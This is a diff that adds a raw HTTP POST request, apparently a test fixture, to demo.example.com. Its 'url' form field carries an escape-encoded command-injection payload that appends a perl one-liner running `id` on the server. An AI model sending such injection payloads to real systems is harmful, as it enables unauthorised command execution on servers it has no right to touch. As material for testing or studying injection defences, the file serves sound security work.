@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Connection: close
+
+url=\u003B perl -e \u0027print `id`\u0027
